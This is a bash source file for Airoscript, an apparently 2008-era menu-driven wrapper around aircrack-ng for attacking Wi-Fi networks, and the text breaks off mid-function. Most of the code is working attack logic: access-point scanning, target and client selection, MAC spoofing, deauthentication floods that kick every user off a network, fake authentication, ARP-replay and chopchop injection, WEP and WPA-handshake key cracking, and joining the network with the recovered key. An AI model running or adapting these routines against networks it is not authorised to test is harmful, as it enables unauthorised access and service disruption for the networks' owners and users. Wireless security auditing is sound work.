#! /bin/bash

# Program:	Airoscript                                                          
# Authors:	Base Code by Daouid; Mods & Tweaks by CurioCT and others
# Credits:      Hirte, Befa, Stouf, Mister_X, ASPj , Andrea, Pilotsnipes, darkAudax, Atheros support thx to green-freq
# Date:	        28.01.2008
# Version:	2.0.8 SVN TESTING RELEASE FOR AIRCRACK-NG 1.0 beta
# Dependencies: aircrack-ng, xterm, grep, awk, macchanger, drivers capable of injection, mdk3 (optional)
#
#		To change color theme just do a search and replace
#
#     Colors:   #Dumping	White	#FFFFFF                                            
#               #Injection	Green	#1DFF00                                            
#               #Association	Red	#FF0009                                            
#               #Deauth	        Blue	#99CCFF                                            
#               #Background	Black	#000000                                            
#                                                                                           
# Notes:  Important  ===>>>  Set variable DEBUG to 1 to enable debugging of errors  <<<===
#         IMPORTANT DO NOT PUT others FILES IN OUTPUT FOLDER, because it's content can be erased
#CardCtl executable (on 2.4 kernels, it is cardctl)
CARDCTL="pccardctl"
#Your dhcp client utility
DHCPSOFT="dhcpcd"
#If you want the welcome message
WELCOME="0"
#Allows all xterm window to stay on screen after the operation they contain is finished
DEBUG="0"
#This is the interface you want to use to perform the attack
#If you dont set this, airoscript will ask you for interface to use
WIFI=""
#This is the rate per second at wich packets will be injected
INJECTRATE="330"
#How many times the deauth attack is run
DEAUTHTIME="3"
#Time between re-association with target AP
AUTHDELAY="80"
KEEPALIVE="30"
#Fudge factor setting
FUDGEFACTOR="2"
#Path to binaries                                     
AIRMON="airmon-ng"		
AIRODUMP="airodump-ng"
AIREPLAY="aireplay-ng"	
AIRCRACK="aircrack-ng"
ARPFORGE="packetforge-ng"
WESSIDE="wesside-ng"
#The path where the data is stored (FOLDER MUST EXIST !)
DUMP_PATH="/wifi"
# Path to your wordlist file (for WPA and WEP dictionnary attack)
WORDLIST="/wifi/wordlist.txt"
#The Mac address used to associate with AP during fakeauth			
FAKE_MAC="00:06:25:02:FF:D8"
# IP of the AP and clients to be used for CHOPCHOP and Fragmentation attack
# Host_IP and Client_IP used for arp generation from xor file (frag and chopchop)
#Host_IP="192.168.1.1"
#Client_IP="192.168.1.37"
#Host_IP="192.168.0.1"
#Client_IP="192.168.0.37"
Host_IP="255.255.255.255"
Client_IP="255.255.255.255"
# Fragmentation IP
#FRAG_HOST_IP="192.168.1.1"
#FRAG_CLIENT_IP="192.168.1.37"
#FRAG_HOST_IP="192.168.0.1"
#FRAG_CLIENT_IP="192.168.0.37"
FRAG_HOST_IP="255.255.255.255"
FRAG_CLIENT_IP="255.255.255.255"

# leave this alone (if you edit this, it will screw up the menu)
CHOICES="1 2 3 4 5 6 7 8 9 10 11 12"
#This is the window size and layout settings
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 96x25+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 70x25-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 96x25+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 70x25-0-0"
TOPLEFTBIG="-geometry 96x60+0+0"
TOPRIGHTBIG="-geometry 70x60-0+0"
##################################################################################
#
#  Functions: these are all the commands used by the script
#
# menu listing command	
function menu {
  echo "Select next action              "
  echo ""
  echo "### 1) Scan    - Scan for target    ###"
  echo "### 2) Select  - Select target      ###"
  echo "### 3) Attack  - Attack target      ###"
  echo "### 4) Crack   - Get target key     ###"
  echo "### 5) Config  - Connect to target  ###"
  echo "### 6) Fakeauth- Auth with target   ###"
  echo "### 7) Deauth  - Deauth from target ###"
  echo "### 8) Others  - Various utilities  ###"
  echo "### 9) Inject  - Jump to inj. menu  ###"
  echo ""			
}

# starts monitor mode on selected interface		
function monitor_interface {
if [ "$TYPE" = "RalinkUSB" ]
then
IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
iwconfig $WIFI mode monitor
echo $IS_MONITOR

elif [ "$TYPE" = "Ralinkb/g" ]
then
IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
iwpriv $WIFI rfmontx 1
iwpriv $WIFI forceprism 1
echo $IS_MONITOR

elif [ "$TYPE" = "Atherosmadwifi-ng" ]
then
IS_MONITOR=`$AIRMON start wifi0 |grep monitor`
$AIRMON stop ath0
$AIRMON stop ath1
$AIRMON stop ath2
echo $IS_MONITOR
else
IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
echo "running standard monitor mode command"
echo $IS_MONITOR
fi 
}


function airmoncheck {
if [ "$TYPE" = "RalinkUSB" ]
then
$AIRMON check $WIFI
echo ""

elif [ "$TYPE" = "Ralinkb/g" ]
then
$AIRMON check $WIFI
echo ""

elif [ "$TYPE" = "Atherosmadwifi-ng" ]
then
$AIRMON check wifi0
echo ""

else
$AIRMON check $WIFI
echo ""
fi 
}


function monitor_interface2 {
if [ "$TYPE" = "RalinkUSB" ]
then
IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
iwconfig $WIFI mode monitor channel $Host_CHAN
echo $IS_MONITOR

elif [ "$TYPE" = "Ralinkb/g" ]
then
IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
iwpriv $WIFI rfmontx 1
iwpriv $WIFI forceprism 1
echo $IS_MONITOR

elif [ "$TYPE" = "Atherosmadwifi-ng" ]
then
IS_MONITOR=`$AIRMON start wifi0 $Host_CHAN |grep monitor`
$AIRMON stop ath0
$AIRMON stop ath1
$AIRMON stop ath2
echo $IS_MONITOR
else
IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
echo "running standard monitor mode command"
echo $IS_MONITOR
fi 
}

# this sets wifi interface if not hard coded in the script
function setinterface {
#INTERFACES=`iwconfig|grep --regexp=^[^:blank:].[:alnum:]|awk '{print $1}'`
#INTERFACES=`iwconfig|egrep "^[a-Z]+[0-9]+" |awk '{print $1}'`
INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
if [ "$WIFI" = "" ]
then
echo "=> Select your interface: (athX for madwifi devices)"
echo ""
select WIFI in $INTERFACES; do
break;
done
TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
clear
echo "Interface used is : $WIFI"
echo "Interface type is : $TYPE"
testmac
else
TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
clear
echo "Interface used is : $WIFI"
echo "Interface type is : $TYPE"
testmac 
fi
}
function testmac {
if [ "$TYPE" = "Atherosmadwifi-ng" ]
then
echo "Previous fake_mac : $FAKE_MAC"
FAKE_MAC=`ifconfig $WIFI | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
echo "Changed fake_mac : $FAKE_MAC" 
else
echo ""
fi
}
function setinterface2 {
INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
echo "   Select your interface"
echo " "
select WIFI in $INTERFACES; do
break;
done
TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
clear
echo "Interface used is : $WIFI"
echo "Interface type is : $TYPE"
testmac
}
# this function allows debugging of xterm commands
function debug {
if [ $DEBUG = 1 ]
then
echo " 	Debug Mode On              "
HOLD="-hold"
else
HOLD=""
fi
}
# This is another great contribution from CurioCT that allows you to manually enter SSID if none is set
function blankssid {
while true; do
  clear
  echo "#######################################"
  echo "###       Blank SSID detected       ###"
  echo "###    Do you want to in put one    ###"
  echo "###    1) Yes                       ###"
  echo "###    2) No                        ###"
  read yn
  case $yn in
    1 ) Host_ssidinput ; break ;;
    2 ) Host_SSID="" ; break ;;
    * ) echo "unknown response. Try again" ;;
esac
done
}
# This is the input part of previous function
function Host_ssidinput {
  echo "#######################################"
  echo "###       Please enter SSID         ###"
read Host_SSID
set -- ${Host_SSID}
clear
}
# This is the function to select Target from a list
## MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room  
## And HIRTE for making all those great patch and fixing the SSID issue	
function Parseforap {
ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
clear
echo "        Detected Access point list"
echo ""
echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
echo ""
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
    aspeed[$i]=$SPEED
   fi
done < $DUMP_PATH/dump-02.txt
echo ""
echo "        Select target             "
read choice
idlenght=${aidlenght[$choice]}
ssid=${assid[$choice]}
channel=${achannel[$choice]}
mac=${amac[$choice]}
privacy=${aprivacy[$choice]}
speed=${aspeed[$choice]}
Host_IDL=$idlength
Host_SPEED=$speed
Host_ENC=$privacy
Host_MAC=$mac
Host_CHAN=$channel
acouper=${#ssid}
fin=$(($acouper-idlength))
Host_SSID=${ssid:1:fin}
}
function choosetype {
while true; do
  clear
  echo "#######################################"
  echo "###     Select AP specification     ###"
  echo "###                                 ###"
  echo "###   1) No filter                  ###"
  echo "###   2) OPN                        ###"
  echo "###   3) WEP                        ###"
  echo "###   4) WPA                        ###"
  echo "###   5) WPA1                       ###"
  echo "###   6) WPA2                       ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) ENCRYPT="" ; break ;;
    2 ) ENCRYPT="OPN" ; break ;;
    3 ) ENCRYPT="WEP" ; break ;;
    4 ) ENCRYPT="WPA" ; break ;;
    5 ) ENCRYPT="WPA1" ; break ;;
    6 ) ENCRYPT="WPA2" ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function choosefake {
while true; do
  clear
  echo "#######################################"
  echo "###   Select fakeauth method        ###"
  echo "###                                 ###"
  echo "###   1) Conservative               ###"
  echo "###   2) Standard                   ###"
  echo "###   3) Progressive                ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) fakeauth1 ; break ;;
    2 ) fakeauth2 ; break ;;
    3 ) fakeauth3 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function choosescan {
while true; do
  echo "#######################################"
  echo "###  Select channel to use          ###"
  echo "###                                 ###"
  echo "###   1) Channel Hopping            ###"
  echo "###   2) Specific channel(s)        ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) Scan ; break ;;
    2 ) Scanchan ; break ;;  
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function choosetarget {
while true; do
  clear
  echo "#######################################"
  echo "### Do you want to select a client? ###"
  echo "###                                 ###"
  echo "###   1) Yes, only associated       ###"
  echo "###   2) No i dont want to          ###"
  echo "###   3) Try to detect some         ###"
  echo "###   4) Yes show me the clients    ###"
  echo "###   5) Correct the SSID first     ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) listsel2  ; break ;;
    2 ) break ;;
    3 ) clientdetect && clientfound ; break ;;
    4 ) askclientsel ; break ;;
    5 ) Host_ssidinput && choosetarget ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function clientfound {
while true; do
  clear
  echo "#######################################"
  echo "###  Did you find desired client?   ###"
  echo "###                                 ###"
  echo "###   1) Yes, someone associated    ###" 
  echo "###   2) No, no clients showed up   ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) listsel3 ; break ;;
    2 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function choosedeauth {
while true; do
  clear
  echo "#######################################"
  echo "###   Who do you want to deauth ?   ###"
  echo "###                                 ###"
  echo "###   1) Everybody                  ###"
  echo "###   2) Myself (the Fake MAC)      ###"
  echo "###   3) Selected client            ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) deauthall ; break ;;
    2 ) deauthfake ; break ;;
    3 ) deauthclient ; break ;; 
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function attackwep {
while true; do
  clear
  echo "#######################################"
  echo "### Attacks not using a client      ###"
  echo "### 1)  Fake auth => Automatic      ###"
  echo "### 2)  Fake auth => Interactive    ###"
  echo "### 3)  Fragmentation attack        ###"
  echo "### 4)  Chopchop attack             ###"
  echo "#######################################"
  echo "### Attacks using a client          ###"
  echo "### 5)  ARP replay => Automatic     ###"
  echo "### 6)  ARP replay => Interactive   ###"
  echo "### 7)  Fragmentation attack        ###"
  echo "### 8)  Chopchop attack             ###"
  echo "#######################################"
  echo "### Injection if xor file generated ###" 
  echo "### 9) ARP inject from xor (PSK)    ###"
  echo "### 10) Return to main menu         ###"
  read yn
  echo ""
  case $yn in
    1 ) attack ; break ;;
    2 ) fakeinteractiveattack ; break ;;
    3 ) fragnoclient ; break ;;
    4 ) chopchopattack ; break ;;
    5 ) attackclient ; break ;;
    6 ) interactiveattack ; break ;;
    7 ) fragmentationattack ; break ;;
    8 ) chopchopattackclient ; break ;;
    9 ) pskarp ; break ;;
   10 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function attackopn {
  echo "#######################################"
  echo "###   You need to select a target   ###"
  echo "#######################################"
}
function askclientsel {
while true; do
  clear
  echo "#######################################"
  echo "###      Select next step           ###"
  echo "###                                 ###"
  echo "###   1) Detected clients           ###"
  echo "###   2) Manual Input               ###"
  echo "###   3) Associated client list     ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) asklistsel ; break ;;
    2 ) clientinput ; break ;;
    3 ) listsel2 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function clientinput {
  echo "#######################################"
  echo "###                                 ###"
  echo "###   Type in client mac now        ###"
  echo "###                                 ###"
  echo "#######################################"
read Client_MAC
  echo "#######################################"
  echo "###                                 ###"
  echo "###   You typed: $Client_MAC  ###"
  echo "###                                 ###"
  echo "#######################################"
set -- ${Client_MAC}
}
function asklistsel {
while true; do
  clear
  echo "#######################################"
  echo "###      Select next step           ###"
  echo "###                                 ###"
  echo "###   1) Clients of $Host_SSID      ###"
  echo "###   2) Full list (all MACs)       ###"
  echo "###                                 ###"
  echo "#######################################"
if [ "$Host_SSID" = $'\r' ]
  		then
Host_SSID="No SSID has been detected!"
fi
  echo  
read yn
  case $yn in
    1 ) listsel2 ; break ;;
    2 ) listsel1 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function listsel1 {
HOST=`cat $DUMP_PATH/dump-01.txt | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
	clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###       Select client now         ###"
  echo "###                                 ###"
  echo "#######################################"
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
function listsel2 {
HOST=`cat $DUMP_PATH/dump-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
	clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###       Select client now         ###"
  echo "###  These clients are connected to ###
  echo "###          $Host_SSID             ###"
  echo "###                                 ###"
  echo "#######################################"
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
function listsel3 {
HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
	clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###       Select client now         ###"
  echo "###  These clients are connected to ###
  echo "###          $Host_SSID             ###"
  echo "###                                 ###"
  echo "#######################################"
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
function cleanup {
	killall -9 aireplay-ng airodump-ng > /dev/null &
	ifconfig $WIFI down
	clear
        sleep 2
	$CARDCTL eject
	sleep 2
	$CARDCTL insert
	ifconfig $WIFI up
	$AIRMON start $WIFI $Host_CHAN
	iwconfig $WIFI
}
function target {
  echo "#######################################"
  echo "###                                 ###"
  echo "###   AP SSID   = $Host_SSID"
  echo "###   AP MAC    = $Host_MAC"
  echo "###   AP Chan   =$Host_CHAN"
  echo "###   ClientMAC = $Client_MAC"
  echo "###   FakeMAC 	= $FAKE_MAC"
  echo "###   AP Encrypt= $Host_ENC"
  echo "###   AP Speed  =$Host_SPEED"
  echo "###"
  echo "#######################################"
}  
# interface configuration using found key (tweaks by CurioCT) 	
function configure {
		$AIRCRACK -a 1 -b $Host_MAC -s -0 -z $DUMP_PATH/$Host_MAC-01.cap &> $DUMP_PATH/$Host_MAC.key 
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
		echo "Using this key $KEY to connect to: $Host_SSID"
		echo ""
		echo "Setting: iwconfig $WIFI mode Managed"
		ifconfig $WIFI down
		sleep 3
		ifconfig $WIFI up
		sleep 2
		iwconfig $WIFI mode Managed ap any rate auto channel $Host_CHAN essid "$Host_SSID" key restricted $KEY 
		sleep 1
		echo "Setting: iwconfig $WIFI essid $Host_SSID"
		iwconfig $WIFI essid "$Host_SSID"
		echo "Setting: iwconfig $WIFI key $KEY"
		iwconfig $WIFI key restricted $KEY
		echo "Setting: $DHCPSOFT $WIFI"
		sleep 1
		iwconfig $WIFI rate auto
		iwconfig $WIFI ap any
		sleep 3
		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
		sleep 3
		$DHCPSOFT $WIFI
		echo "Will now ping google.com"
		ping www.google.com
}
function wpaconfigure {
		$AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
		echo "Using this key $KEY to connect to: $Host_SSID"
		echo ""
		echo "Setting: iwconfig $WIFI mode Managed"
		ifconfig $WIFI down
		sleep 3
		ifconfig $WIFI up
		sleep 2
		iwconfig $WIFI mode Managed ap any rate auto channel $Host_CHAN essid "$Host_SSID" key restricted $KEY 
		sleep 1
		echo "Setting: iwconfig $WIFI essid $Host_SSID"
		iwconfig $WIFI essid "$Host_SSID"
		echo "Setting: iwconfig $WIFI key $KEY"
		iwconfig $WIFI key restricted $KEY
		echo "Setting: $DHCPSOFT $WIFI"
		sleep 1
		iwconfig $WIFI rate auto
		iwconfig $WIFI ap any
		sleep 3
		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
		sleep 3
		$DHCPSOFT $WIFI
		echo "Will now ping google.com"
		ping www.google.com
}
function witchcrack {
if [ $Host_ENC = "WEP" ]
  		then
		crack
		else
		wpacrack
		fi			
}
function witchattack {
if [ $Host_ENC = "WEP" ]
  		then
		monitor_interface2
		attackwep
		elif [ $Host_ENC = "WPA" ]
		then
		monitor_interface2
		wpahandshake
		else
		attackopn
		fi			
}
function wichchangemac {
while true; do
  echo "#######################################"
  echo "###      Select next step           ###"
  echo "###                                 ###"
  echo "###   1) Change MAC to FAKEMAC      ###"
  echo "###   2) Change MAC to CLIENTMAC    ###"
  echo "###   3) Manual Mac input           ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) fakemacchanger ; break ;;
    2 ) macchanger ; break ;;
    3 ) macinput ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function macinput {
echo -n "OK, now type in new MAC: "
read MANUAL_MAC
echo You typed: $MANUAL_MAC
set -- ${MANUAL_MAC}
manualmacchanger
}
function fakemacchanger {
if [ "$TYPE" = "RalinkUSB" ]
  		then
		fakechangemacrausb
		elif [ "$TYPE" = "Ralinkb/g" ]
		then
		fakechangemacwlan
		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
		then
		fakechangemacath
		else
		echo "Unknow way to change mac"
		fi			
}
function fakechangemacrausb {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $FAKE_MAC $WIFI 
ifconfig $WIFI up
iwconfig $WIFI mode monitor			
}
function fakechangemacwlan {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $FAKE_MAC $WIFI 
ifconfig $WIFI up
iwconfig $WIFI mode monitor		
}
function fakechangemacath {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $FAKE_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor			
}
function macchanger {
if [ "$TYPE" = "RalinkUSB" ]
then
changemacrausb
elif [ "$TYPE" = "Ralinkb/g" ]
then 
changemacwlan
elif [ "$TYPE" = "Atherosmadwifi-ng" ]
then
changemacath
else
echo "Unknow way to change mac"
fi			
}
function changemacrausb {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $Client_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor			
}
function changemacwlan {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $Client_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor			
}
function changemacath {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $Client_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor			
}
function manualmacchanger {
if [ "$TYPE" = "RalinkUSB" ]
then
manualchangemacrausb
elif [ "$TYPE" = "Ralinkb/g" ]
then
manualchangemacwlan
elif [ "$TYPE" = "Atherosmadwifi-ng" ]
then
manualchangemacath
else
echo "Unknow way to change mac"
fi			
}
function manualchangemacrausb {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $Client_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor			
}
function manualchangemacwlan {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $Client_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor				
}
function manualchangemacath {
ifconfig $WIFI down
iwconfig $WIFI mode managed
sleep 2
macchanger -m $Client_MAC $WIFI
ifconfig $WIFI up
iwconfig $WIFI mode monitor				
}
function witchconfigure {
if [ $Host_ENC = "WEP" ]
  		then
		configure
		else
		wpaconfigure
		fi			
}
function crackptw   {
xterm -hold -title "Aircracking-PTW: $Host_SSID" $TOPRIGHT -e $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
}
function crackstd   {
xterm -hold -title "Aircracking: $Host_SSID" $TOPRIGHT -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
}
function crackman {
echo -n "type fudge factor"
read FUDGE_FACTOR
echo You typed: $FUDGE_FACTOR
set -- ${FUDGE_FACTOR}
echo -n "type encryption size 64,128 etc..."
read ENC_SIZE
echo You typed: $ENC_SIZE
set -- ${ENC_SIZE}
xterm -hold -title "Manual cracking: $Host_SSID" $TOPRIGHT -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
}
function crack {
while true; do
  echo "#######################################"
  echo "###      WEP CRACKING OPTIONS       ###"
  echo "###                                 ###"
  echo "###   1) aircrack-ng PTW attack     ###"
  echo "###   2) aircrack-ng standard       ###"
  echo "###   3) aircrack-ng user options   ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) crackptw ; break ;;
    2 ) crackstd ; break ;;
    3 ) crackman ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function wpahandshake {
clear
rm -rf $DUMP_PATH/$Host_MAC*
xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
}
function wpacrack {
xterm -hold $TOPRIGHT -title "Aircracking: $Host_SSID" -e $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
}
function Scan {
clear
rm -rf $DUMP_PATH/dump*
xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
}
function Scanchan {
  echo "#######################################"
  echo "###    Input channel number         ###"
  echo "###                                 ###"
  echo "###  A single number   6            ###"
  echo "###  A range           1-5          ###"
  echo "###  Multiple channels 1,1,2,5-7,11 ###"
  echo "###                                 ###"
  echo "#######################################"
read channel_number
echo You typed: $channel_number
set -- ${channel_number}
clear
rm -rf $DUMP_PATH/dump*
$AIRMON start $WIFI $channel_number
xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT -a $WIFI
}
function capture {
clear
rm -rf $DUMP_PATH/$Host_MAC*
xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
}
function deauthall {
xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking everybody from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
}
function deauthclient {
xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $Client_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI
}
function deauthfake {
xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $FAKE_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI
}
function fakeauth {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI
}
function fakeauth1 {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
}
function fakeauth2 {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
}
function fakeauth3 {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
}
function clientdetect {
iwconfig $WIFI channel $Host_CHAN
capture & deauthall & menufonction
}
function attack {
capture & xterm $HOLD -title "Injection: Host: $Host_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & fakeauth3 & menufonction
}
function attackclient {
capture & xterm $HOLD -title "Injection: Host : $Host_MAC CLient : $Client_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
}
function interactiveattack {
capture & xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
}
function fakeinteractiveattack {
capture & xterm $HOLD -title "Interactive Packet Sel on Host: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & fakeauth3 & menufonction
}
function chopchopattack {
clear
rm -rf $DUMP_PATH/$Host_MAC*
rm -rf replay_dec-*.xor
capture &  fakeauth3 &  xterm -hold -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI & injectmenu
}
function chopchopattackclient {
clear
rm -rf $DUMP_PATH/$Host_MAC*
rm -rf replay_dec-*.xor
capture &  xterm -hold -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & injectmenu
}
function chopchopend {
